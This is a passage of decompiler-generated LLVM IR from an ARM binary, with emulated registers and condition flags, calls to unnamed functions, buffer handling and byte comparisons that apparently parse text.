  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8bf8 = icmp slt i32 %v3_8bf0, 0
  store i1 %v1_8bf8, i1* %cpsr_n.global-to-local, align 1
  %v2_8bf8 = icmp eq i32 %v3_8bf0, 0
  store i1 %v2_8bf8, i1* %cpsr_z.global-to-local, align 1
  %v0_8bfc = load i32, i32* @r5, align 4
  store i32 %v0_8bfc, i32* %stack_var_-40, align 4
  %tmp209 = icmp slt i32 %v3_8bf0, 1
  br i1 %tmp209, label %dec_label_pc_8c60, label %dec_label_pc_8c04

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8bd8, %dec_label_pc_8c04
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c08 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_8c10 = load i32, i32* %stack_var_-40, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v1_8c18 = and i32 %v3_8c10, 33554432
  %v2_8c18 = icmp ne i32 %v1_8c18, 0
  store i1 %v2_8c18, i1* %cpsr_c.global-to-local, align 1
  %v3_8c18 = mul i32 %v3_8c10, 128
  %v1_8c1c = add i32 %v3_8c18, 1472
  %v2_8c20 = add i32 %v2_8c08, %stack_var_-20856.0.ph
  store i32 %v2_8c20, i32* @r0, align 4
  %v0_8c24 = load i32, i32* @r7, align 4
  %v2_8c24 = add i32 %v1_8c1c, %v0_8c24
  store i32 %v2_8c24, i32* %r1.global-to-local, align 4
  %v2_8c28 = inttoptr i32 %v2_8c20 to i8*
  %v3_8c28 = call i32 @function_12cbc(i8* %v2_8c28, i32 %v2_8c24)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c30 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f30.38 to i32), i32* %r1.global-to-local, align 4
  %v2_8c3c = add i32 %v2_8c30, %stack_var_-20856.0.ph
  store i32 %v2_8c3c, i32* @r0, align 4
  %v3_8c40 = inttoptr i32 %v2_8c3c to i8*
  %v4_8c40 = call i32 @function_12cbc(i8* %v3_8c40, i32 ptrtoint ([3 x i8]* @global_var_15f30.38 to i32))
  store i32 %v4_8c40, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v3_8c48 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_8c48, i32* %r3.global-to-local, align 4
  %v0_8c4c = load i32, i32* @r6, align 4
  %v1_8c4c = add i32 %v0_8c4c, 37
  %v2_8c4c = inttoptr i32 %v1_8c4c to i32*
  %v3_8c4c = load i32, i32* %v2_8c4c, align 4
  store i32 %v3_8c4c, i32* %r2.global-to-local, align 4
  %v1_8c50 = add i32 %v3_8c48, 1
  store i32 %v1_8c50, i32* %ip.global-to-local, align 4
  %v2_8c54 = sub i32 %v3_8c4c, %v1_8c50
  %v3_8c54 = icmp uge i32 %v3_8c4c, %v1_8c50
  store i1 %v3_8c54, i1* %cpsr_c.global-to-local, align 1
  %v4_8c54 = xor i32 %v3_8c4c, %v1_8c50
  %v5_8c54 = xor i32 %v2_8c54, %v3_8c4c
  %v6_8c54 = and i32 %v5_8c54, %v4_8c54
  %v7_8c54 = icmp slt i32 %v6_8c54, 0
  store i1 %v7_8c54, i1* %cpsr_v.global-to-local, align 1
  %v8_8c54 = icmp slt i32 %v2_8c54, 0
  store i1 %v8_8c54, i1* %cpsr_n.global-to-local, align 1
  %v9_8c54 = icmp eq i32 %v3_8c4c, %v1_8c50
  store i1 %v9_8c54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8c50, i32* %stack_var_-40, align 4
  %v8_8c5c = icmp sgt i32 %v3_8c4c, %v1_8c50
  br i1 %v8_8c5c, label %dec_label_pc_8c04, label %dec_label_pc_8c60

dec_label_pc_8c60:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8bd8
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c64 = call i32 @function_12c94(i8* %v1_8940)
  %v2_8c6c = add i32 %v2_8c64, %stack_var_-20856.0.ph
  store i32 %v2_8c6c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8c74 = inttoptr i32 %v2_8c6c to i8*
  %v4_8c74 = call i32 @function_12cbc(i8* %v3_8c74, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 %v4_8c74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c78

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8bcc, %dec_label_pc_8c60
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c7c = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8c88 = add i32 %v2_8c7c, %stack_var_-20856.0.ph
  store i32 %v2_8c88, i32* @r0, align 4
  %v3_8c8c = inttoptr i32 %v2_8c88 to i8*
  %v4_8c8c = call i32 @function_12cbc(i8* %v3_8c8c, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 %v4_8c8c, i32* %r0.global-to-local, align 4
  store i32 %v6_8200, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_8c94, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_8c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c94, label %dec_label_pc_8cb4, label %dec_label_pc_8c9c

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c78
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ca0 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8200, i32* %r1.global-to-local, align 4
  %v2_8cac = add i32 %v2_8ca0, %stack_var_-20856.0.ph
  store i32 %v2_8cac, i32* @r0, align 4
  %v2_8cb0 = inttoptr i32 %v2_8cac to i8*
  %v3_8cb0 = call i32 @function_12cbc(i8* %v2_8cb0, i32 %v6_8200)
  store i32 %v3_8cb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8cb4

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8c78, %dec_label_pc_8c9c
  %v0_8cb4 = load i32, i32* @r7, align 4
  %v1_8cb4 = add i32 %v0_8cb4, 1440
  store i32 %v1_8cb4, i32* %r4.global-to-local, align 4
  %v0_8cb8 = load i32, i32* @r6, align 4
  store i32 %v0_8cb8, i32* %r0.global-to-local, align 4
  store i32 %v1_8cb4, i32* %r1.global-to-local, align 4
  %v2_8cc0 = inttoptr i32 %v0_8cb8 to i8*
  %v3_8cc0 = call i32 @function_13074(i8* %v2_8cc0, i32 %v1_8cb4)
  store i32 %v3_8cc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8cc4 = icmp slt i32 %v3_8cc0, 0
  store i1 %v1_8cc4, i1* %cpsr_n.global-to-local, align 1
  %v2_8cc4 = icmp eq i32 %v3_8cc0, 0
  store i1 %v2_8cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8cc4, label %dec_label_pc_960c, label %dec_label_pc_8ccc

dec_label_pc_8ccc:                                ; preds = %dec_label_pc_8cb4, %dec_label_pc_960c
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_8cd0 = load i32, i32* @r6, align 4
  %v1_8cd0 = add i32 %v0_8cd0, -1431
  %v2_8cd0 = inttoptr i32 %v1_8cd0 to i32*
  %v3_8cd0 = load i32, i32* %v2_8cd0, align 4
  store i32 %v3_8cd0, i32* @r4, align 4
  %v2_8cd4 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8cd4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ce4 = load i32, i32* @r4, align 4
  store i32 %v0_8ce4, i32* %r0.global-to-local, align 4
  %v5_8ce8 = call i32 @function_13ec0(i32 %v0_8ce4, i32* %v4_8ce8, i32 %v2_8cd4, i32 16384)
  store i32 %v5_8ce8, i32* %r0.global-to-local, align 4
  %v0_8cec = load i32, i32* @r6, align 4
  %v1_8cec = add i32 %v0_8cec, -1431
  %v2_8cec = inttoptr i32 %v1_8cec to i32*
  %v3_8cec = load i32, i32* %v2_8cec, align 4
  store i32 %v3_8cec, i32* %r0.global-to-local, align 4
  %v3_8cf4 = udiv i32 %v3_8cec, 32
  %v3_8cf8 = mul nuw nsw i32 %v3_8cf4, 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8d00 = add i32 %v3_8cf8, %v2_8748
  store i32 %v2_8d00, i32* %r3.global-to-local, align 4
  %v1_8d04 = add i32 %v2_8d00, -164
  %v2_8d04 = inttoptr i32 %v1_8d04 to i32*
  %v3_8d04 = load i32, i32* %v2_8d04, align 4
  %v1_8d08 = urem i32 %v3_8cec, 32
  %v1_8d0c = load i32, i32* %fp.global-to-local, align 4
  %v7_8d0c = shl i32 %v1_8d0c, %v1_8d08
  %v8_8d0c = or i32 %v7_8d0c, %v3_8d04
  store i32 %v8_8d0c, i32* %r2.global-to-local, align 4
  %v0_8d10 = load i32, i32* @sl, align 4
  %v2_8d10 = sub i32 %v0_8d10, %v3_8cec
  %v3_8d10 = icmp uge i32 %v0_8d10, %v3_8cec
  store i1 %v3_8d10, i1* %cpsr_c.global-to-local, align 1
  %v4_8d10 = xor i32 %v0_8d10, %v3_8cec
  %v5_8d10 = xor i32 %v2_8d10, %v0_8d10
  %v6_8d10 = and i32 %v5_8d10, %v4_8d10
  %v7_8d10 = icmp slt i32 %v6_8d10, 0
  store i1 %v7_8d10, i1* %cpsr_v.global-to-local, align 1
  %v8_8d10 = icmp slt i32 %v2_8d10, 0
  store i1 %v8_8d10, i1* %cpsr_n.global-to-local, align 1
  %v9_8d10 = icmp eq i32 %v0_8d10, %v3_8cec
  store i1 %v9_8d10, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_8d0c, i32* %v2_8d04, align 4
  %v0_8d1c = load i32, i32* %sb.global-to-local, align 4
  %v1_8d1c = load i32, i32* @r6, align 4
  %v2_8d1c = add i32 %v1_8d1c, -1419
  %v3_8d1c = inttoptr i32 %v2_8d1c to i32*
  store i32 %v0_8d1c, i32* %v3_8d1c, align 4
  %v0_8d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d20 = trunc i32 %v0_8d20 to i8
  %v2_8d20 = load i32, i32* @r6, align 4
  %v3_8d20 = add i32 %v2_8d20, -1427
  %v4_8d20 = inttoptr i32 %v3_8d20 to i8*
  store i8 %v1_8d20, i8* %v4_8d20, align 1
  %v0_8d24 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_8d24 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_8d24 = xor i1 %v0_8d24, %v1_8d24
  br i1 %v2_8d24, label %dec_label_pc_8d28, label %dec_label_pc_8630

dec_label_pc_8d28:                                ; preds = %dec_label_pc_8ccc
  %v0_8d28 = load i32, i32* %r0.global-to-local, align 4
  %v1_8d28 = add i32 %v0_8d28, 1
  store i32 %v1_8d28, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_8d30:                                ; preds = %dec_label_pc_8608
  %v1_8d30 = add i32 %v3_8900, -1431
  %v2_8d30 = inttoptr i32 %v1_8d30 to i32*
  %v3_8d30 = load i32, i32* %v2_8d30, align 4
  store i32 %v3_8d30, i32* %r0.global-to-local, align 4
  %v3_8d38 = udiv i32 %v3_8d30, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d3c = mul nuw nsw i32 %v3_8d38, 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_8d44 = add i32 %v3_8d3c, %v2_8748
  store i32 %v2_8d44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_8d48:                                ; preds = %.thread24, %.thread35, %dec_label_pc_8d30
  %v1_8d54 = phi i32 [ %v4_85ec, %.thread35 ], [ %v4_85cc, %.thread24 ], [ %v3_8d30, %dec_label_pc_8d30 ]
  %v1_8d58 = phi i32 [ %v3_8600, %.thread35 ], [ %v3_85e0, %.thread24 ], [ %v2_8d44, %dec_label_pc_8d30 ]
  %v1_8d48 = add i32 %v1_8d58, -164
  %v2_8d48 = inttoptr i32 %v1_8d48 to i32*
  %v3_8d48 = load i32, i32* %v2_8d48, align 4
  %v1_8d4c = urem i32 %v1_8d54, 32
  store i32 %v1_8d4c, i32* %r1.global-to-local, align 4
  %v1_8d50 = load i32, i32* %fp.global-to-local, align 4
  %v7_8d50 = shl i32 %v1_8d50, %v1_8d4c
  %v8_8d50 = or i32 %v7_8d50, %v3_8d48
  store i32 %v8_8d50, i32* %r2.global-to-local, align 4
  %v0_8d54 = load i32, i32* @sl, align 4
  %v2_8d54 = sub i32 %v0_8d54, %v1_8d54
  %v3_8d54 = icmp uge i32 %v0_8d54, %v1_8d54
  store i1 %v3_8d54, i1* %cpsr_c.global-to-local, align 1
  %v4_8d54 = xor i32 %v0_8d54, %v1_8d54
  %v5_8d54 = xor i32 %v2_8d54, %v0_8d54
  %v6_8d54 = and i32 %v5_8d54, %v4_8d54
  %v7_8d54 = icmp slt i32 %v6_8d54, 0
  store i1 %v7_8d54, i1* %cpsr_v.global-to-local, align 1
  %v8_8d54 = icmp slt i32 %v2_8d54, 0
  store i1 %v8_8d54, i1* %cpsr_n.global-to-local, align 1
  %v9_8d54 = icmp eq i32 %v0_8d54, %v1_8d54
  store i1 %v9_8d54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d50, i32* %v2_8d48, align 4
  %v2_8d5c = xor i1 %v8_8d54, %v7_8d54
  br i1 %v2_8d5c, label %dec_label_pc_8d60, label %dec_label_pc_8630

dec_label_pc_8d60:                                ; preds = %dec_label_pc_8d48
  %v0_8d60 = load i32, i32* %r0.global-to-local, align 4
  %v1_8d60 = add i32 %v0_8d60, 1
  store i32 %v1_8d60, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_8d68:                                ; preds = %dec_label_pc_85b8
  %v1_8d68 = add i32 %v3_8900, -1423
  %v2_8d68 = inttoptr i32 %v1_8d68 to i32*
  %v3_8d68 = load i32, i32* %v2_8d68, align 4
  %v1_8d6c = load i32, i32* %sb.global-to-local, align 4
  %v2_8d6c = sub i32 %v1_8d6c, %v3_8d68
  store i32 %v2_8d6c, i32* %r3.global-to-local, align 4
  %v1_8d70 = add i32 %v2_8d6c, -30
  %v2_8d70 = icmp ugt i32 %v2_8d6c, 29
  store i1 %v2_8d70, i1* %cpsr_c.global-to-local, align 1
  %v3_8d70 = sub i32 29, %v2_8d6c
  %v4_8d70 = and i32 %v3_8d70, %v2_8d6c
  %v5_8d70 = icmp slt i32 %v4_8d70, 0
  store i1 %v5_8d70, i1* %cpsr_v.global-to-local, align 1
  %v6_8d70 = icmp slt i32 %v1_8d70, 0
  store i1 %v6_8d70, i1* %cpsr_n.global-to-local, align 1
  %v7_8d70 = icmp eq i32 %v2_8d6c, 30
  store i1 %v7_8d70, i1* %cpsr_z.global-to-local, align 1
  %v2_8d74 = xor i1 %v7_8d70, true
  %v3_8d74 = and i1 %v2_8d70, %v2_8d74
  br i1 %v3_8d74, label %dec_label_pc_8618, label %dec_label_pc_8d78

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d68
  %v1_8d78 = add i32 %v3_8900, -1431
  %v2_8d78 = inttoptr i32 %v1_8d78 to i32*
  %v3_8d78 = load i32, i32* %v2_8d78, align 4
  store i32 %v3_8d78, i32* %r0.global-to-local, align 4
  %v3_8d80 = udiv i32 %v3_8d78, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8d84 = mul nuw nsw i32 %v3_8d80, 4
  store i32 %v3_8d84, i32* %r3.global-to-local, align 4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_8750

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_881c
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_8dd8 = call i32 @function_12d34(i32 %v2_8280, i32 10240)
  store i32 %v2_8dd8, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_8de4 = load i32, i32* @r8, align 4
  %v1_8de4 = add i32 %v0_8de4, -1456
  %v2_8de4 = inttoptr i32 %v1_8de4 to i32*
  %v3_8de4 = load i32, i32* %v2_8de4, align 4
  store i32 %v3_8de4, i32* %r0.global-to-local, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v5_8df0 = call i32 @function_13e60(i32 %v3_8de4, i32* nonnull %stack_var_-20809, i32 10240, i32 16386)
  store i32 %v5_8df0, i32* %r0.global-to-local, align 4
  store i32 %v5_8df0, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8df8 = icmp slt i32 %v5_8df0, 0
  store i1 %v1_8df8, i1* %cpsr_n.global-to-local, align 1
  %v2_8df8 = icmp eq i32 %v5_8df0, 0
  store i1 %v2_8df8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp210 = icmp slt i32 %v5_8df0, 1
  br i1 %tmp210, label %dec_label_pc_9a7c, label %dec_label_pc_8e04

dec_label_pc_8e04:                                ; preds = %dec_label_pc_8dd0
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 %v5_8df0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f34.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_8e14 = call i32 @function_12d58(i32 %v2_8280, i32 %v5_8df0, i32 ptrtoint ([5 x i8]* @global_var_15f34.40 to i32), i32 4)
  store i32 %v5_8e14, i32* %r0.global-to-local, align 4
  %v1_8e18 = add i32 %v5_8e14, 1
  %v2_8e18 = icmp eq i32 %v5_8e14, -1
  store i1 %v2_8e18, i1* %cpsr_c.global-to-local, align 1
  %v3_8e18 = sub i32 0, %v5_8e14
  %v4_8e18 = and i32 %v1_8e18, %v3_8e18
  %v5_8e18 = icmp slt i32 %v4_8e18, 0
  store i1 %v5_8e18, i1* %cpsr_v.global-to-local, align 1
  %v6_8e18 = icmp slt i32 %v1_8e18, 0
  store i1 %v6_8e18, i1* %cpsr_n.global-to-local, align 1
  %v7_8e18 = icmp eq i32 %v1_8e18, 0
  store i1 %v7_8e18, i1* %cpsr_z.global-to-local, align 1
  %v0_9914 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_8e18, label %dec_label_pc_9914, label %dec_label_pc_8e20

dec_label_pc_8e20:                                ; preds = %dec_label_pc_8e04, %dec_label_pc_9914
  store i32 ptrtoint ([5 x i8]* @global_var_15f34.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_9914, i32* %r1.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v5_8e30 = call i32 @function_12d58(i32 %v2_8280, i32 %v0_9914, i32 ptrtoint ([5 x i8]* @global_var_15f34.40 to i32), i32 4)
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_8e3c = add i32 %v5_8e30, %v2_8748
  store i32 %v2_8e3c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_8e44 = load i32, i32* @r6, align 4
  %v4_8e44 = add i32 %v3_8e44, %v2_8e3c
  %v5_8e44 = inttoptr i32 %v4_8e44 to i8*
  store i8 0, i8* %v5_8e44, align 1
  %v0_8e48 = load i32, i32* @r5, align 4
  store i32 %v0_8e48, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_8e50 = inttoptr i32 %v0_8e48 to i32*
  %v3_8e50 = call i32 @function_12288(i32 46, i32* %v2_8e50)
  %v0_8e54 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8e54, i32* @r1, align 4
  store i32 %v3_8e50, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8e60 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_8e54, i32 %v3_8e50)
  store i32 %v4_8e60, i32* %r0.global-to-local, align 4
  %v1_8e64 = add i32 %v4_8e60, 1
  %v2_8e64 = icmp eq i32 %v4_8e60, -1
  store i1 %v2_8e64, i1* %cpsr_c.global-to-local, align 1
  %v3_8e64 = sub i32 0, %v4_8e60
  %v4_8e64 = and i32 %v1_8e64, %v3_8e64
  %v5_8e64 = icmp slt i32 %v4_8e64, 0
  store i1 %v5_8e64, i1* %cpsr_v.global-to-local, align 1
  %v6_8e64 = icmp slt i32 %v1_8e64, 0
  store i1 %v6_8e64, i1* %cpsr_n.global-to-local, align 1
  %v7_8e64 = icmp eq i32 %v1_8e64, 0
  store i1 %v7_8e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e64, label %.thread45, label %bb211

bb211:                                            ; preds = %dec_label_pc_8e20
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_8e6c = load i32, i32* @r8, align 4
  %v3_8e6c = add i32 %v2_8e6c, -4
  %v4_8e6c = inttoptr i32 %v3_8e6c to i32*
  store i32 2, i32* %v4_8e6c, align 4
  br label %.thread45

.thread45:                                        ; preds = %dec_label_pc_8e20, %bb211
  %v0_8e70 = load i32, i32* @r5, align 4
  store i32 %v0_8e70, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_8e78 = inttoptr i32 %v0_8e70 to i32*
  %v3_8e78 = call i32 @function_12288(i32 45, i32* %v2_8e78)
  %v0_8e7c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8e7c, i32* @r1, align 4
  store i32 %v3_8e78, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8e88 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_8e7c, i32 %v3_8e78)
  store i32 %v4_8e88, i32* %r0.global-to-local, align 4
  %v1_8e8c = add i32 %v4_8e88, 1
  %v2_8e8c = icmp eq i32 %v4_8e88, -1
  store i1 %v2_8e8c, i1* %cpsr_c.global-to-local, align 1
  %v3_8e8c = sub i32 0, %v4_8e88
  %v4_8e8c = and i32 %v1_8e8c, %v3_8e8c
  %v5_8e8c = icmp slt i32 %v4_8e8c, 0
  store i1 %v5_8e8c, i1* %cpsr_v.global-to-local, align 1
  %v6_8e8c = icmp slt i32 %v1_8e8c, 0
  store i1 %v6_8e8c, i1* %cpsr_n.global-to-local, align 1
  %v7_8e8c = icmp eq i32 %v1_8e8c, 0
  store i1 %v7_8e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e8c, label %.thread46, label %bb212

bb212:                                            ; preds = %.thread45
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8e94 = load i32, i32* @r8, align 4
  %v3_8e94 = add i32 %v2_8e94, -4
  %v4_8e94 = inttoptr i32 %v3_8e94 to i32*
  store i32 1, i32* %v4_8e94, align 4
  br label %.thread46

.thread46:                                        ; preds = %.thread45, %bb212
  %v0_8e98 = load i32, i32* @r5, align 4
  store i32 %v0_8e98, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8ea0 = load i32, i32* @r8, align 4
  %v2_8ea0 = inttoptr i32 %v1_8ea0 to i32*
  store i32 %v0_8e98, i32* %v2_8ea0, align 4
  %v2_8ea4 = inttoptr i32 %v0_8e98 to i32*
  %v3_8ea4 = call i32 @function_12288(i32 44, i32* %v2_8ea4)
  %v0_8ea8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  store i32 %v3_8ea4, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8eb4 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_8ea8, i32 %v3_8ea4)
  store i32 %v4_8eb4, i32* %r0.global-to-local, align 4
  %v1_8eb8 = add i32 %v4_8eb4, 1
  %v2_8eb8 = icmp eq i32 %v4_8eb4, -1
  store i1 %v2_8eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_8eb8 = sub i32 0, %v4_8eb4
  %v4_8eb8 = and i32 %v1_8eb8, %v3_8eb8
  %v5_8eb8 = icmp slt i32 %v4_8eb8, 0
  store i1 %v5_8eb8, i1* %cpsr_v.global-to-local, align 1
  %v6_8eb8 = icmp slt i32 %v1_8eb8, 0
  store i1 %v6_8eb8, i1* %cpsr_n.global-to-local, align 1
  %v7_8eb8 = icmp eq i32 %v1_8eb8, 0
  store i1 %v7_8eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8eb8, label %.thread47, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %.thread46
  %v0_8ec0 = load i32, i32* @r5, align 4
  store i32 %v0_8ec0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_8ec8 = inttoptr i32 %v0_8ec0 to i32*
  %v3_8ec8 = call i32 @function_12288(i32 44, i32* %v2_8ec8)
  %v0_8ecc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8ecc, i32* @r1, align 4
  store i32 %v3_8ec8, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8ed8 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_8ecc, i32 %v3_8ec8)
  store i32 %v4_8ed8, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8ee4 = add i32 %v4_8ed8, %v2_8748
  store i32 %v2_8ee4, i32* %r3.global-to-local, align 4
  %v1_8ee8 = load i32, i32* @r6, align 4
  %v2_8ee8 = add i32 %v1_8ee8, %v2_8ee4
  %v3_8ee8 = inttoptr i32 %v2_8ee8 to i8*
  %v4_8ee8 = load i8, i8* %v3_8ee8, align 1
  %v2_8ef0 = icmp ugt i8 %v4_8ee8, 31
  store i1 %v2_8ef0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8ef0 = icmp ult i8 %v4_8ee8, 32
  store i1 %v6_8ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_8ef0 = icmp eq i8 %v4_8ee8, 32
  store i1 %v7_8ef0, i1* %cpsr_z.global-to-local, align 1
  %v2_8ef8 = zext i1 %v7_8ef0 to i32
  %v2_8ef8.v4_8ed8 = add i32 %v2_8ef8, %v4_8ed8
  store i32 %v2_8ef8.v4_8ed8, i32* @r4, align 4
  %v2_8efc = add i32 %v2_8ef8.v4_8ed8, %v2_8280
  store i32 %v2_8efc, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8efc, i32* %r0.global-to-local, align 4
  %v1_8f08 = load i32, i32* %fp.global-to-local, align 4
  %v2_8f08 = sub i32 %v1_8f08, %v2_8ef8.v4_8ed8
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8f10 = call i32 @function_12d58(i32 %v2_8efc, i32 %v2_8f08, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  store i32 %v5_8f10, i32* %r0.global-to-local, align 4
  %v1_8f14 = add i32 %v5_8f10, 1
  %v2_8f14 = icmp eq i32 %v5_8f10, -1
  store i1 %v2_8f14, i1* %cpsr_c.global-to-local, align 1
  %v3_8f14 = sub i32 0, %v5_8f10
  %v4_8f14 = and i32 %v1_8f14, %v3_8f14
  %v5_8f14 = icmp slt i32 %v4_8f14, 0
  store i1 %v5_8f14, i1* %cpsr_v.global-to-local, align 1
  %v6_8f14 = icmp slt i32 %v1_8f14, 0
  store i1 %v6_8f14, i1* %cpsr_n.global-to-local, align 1
  %v7_8f14 = icmp eq i32 %v1_8f14, 0
  store i1 %v7_8f14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_8f10, i32* %r2.global-to-local, align 4
  br i1 %v7_8f14, label %.thread47, label %dec_label_pc_8f20

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8ec0
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_8f28 = load i32, i32* @r4, align 4
  %v2_8f28 = add i32 %v1_8f28, %v2_8748
  %v1_8f2c = add i32 %v5_8f10, -1
  %v2_8f2c = icmp ne i32 %v5_8f10, 0
  store i1 %v2_8f2c, i1* %cpsr_c.global-to-local, align 1
  %v3_8f2c = sub i32 0, %v5_8f10
  %v4_8f2c = and i32 %v5_8f10, %v3_8f2c
  %v5_8f2c = icmp slt i32 %v4_8f2c, 0
  store i1 %v5_8f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_8f2c = icmp slt i32 %v1_8f2c, 0
  store i1 %v6_8f2c, i1* %cpsr_n.global-to-local, align 1
